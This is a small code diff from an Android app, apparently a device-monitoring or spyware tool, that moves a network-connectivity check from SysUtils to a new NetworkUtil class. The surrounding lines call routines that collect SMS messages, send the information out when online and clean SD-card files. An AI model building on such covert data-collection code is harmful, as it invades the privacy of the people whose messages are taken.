@@ -30,6 +30,7 @@ import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
+import com.particle.inspector.common.util.NetworkUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
@@ -161,7 +162,7 @@ public class InitActivity extends Activity
     					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
     					
     					// If network connected, try to collect and send the information
-    					if (!SysUtils.isNetworkConnected(context)) {
+    					if (!NetworkUtil.isNetworkConnected(context)) {
     						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
     						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
     						return;
@@ -179,7 +180,7 @@ public class InitActivity extends Activity
     					GetInfoTask.CollectSms(context);
         		
     					// If network connected, try to collect and send the information
-    					if (!SysUtils.isNetworkConnected(context)) {
+    					if (!NetworkUtil.isNetworkConnected(context)) {
     						// Clean the files in SD-CARD
         					FileCtrl.cleanFolder();
         					
